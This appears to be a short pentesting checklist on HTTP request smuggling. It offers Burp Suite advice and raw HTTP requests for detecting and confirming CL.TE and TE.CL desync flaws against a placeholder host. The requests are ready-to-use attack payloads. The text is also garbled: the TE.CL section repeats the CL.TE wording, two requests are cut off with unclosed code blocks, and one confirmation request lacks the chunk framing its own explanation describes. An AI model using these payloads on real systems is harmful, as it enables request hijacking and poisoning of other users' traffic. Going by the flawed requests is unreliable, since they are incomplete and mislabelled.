#### HTTP Request Smuggling
[ ] Important note:
Ensure that the "Update Content-Length" option is unchecked in Burp Suite when performing smuggling attacks. 

[ ] Finding CL.TE vulnerabilities using timing techniques
If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay: 
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

[ ] Finding TE.CL vulnerabilities using timing techniques
If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay: 
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

[ ] Confirming CL.TE vulnerabilities using differential responses
To confirm a CL.TE vulnerability, you would send an attack request like below. If the attack is successful, then the last two lines of this request are treated by the back-end server and it returns response of GET /404. 
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

GET /404 HTTP/1.1
Foo: x
```

[ ] Confirming TE.CL vulnerabilities using differential responses
To confirm a TE.CL vulnerability, you would send an attack request like below. If the attack is successful, then everything from GET /404 onwards is treated by the back-end server and it returns response of GET /404. 
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked
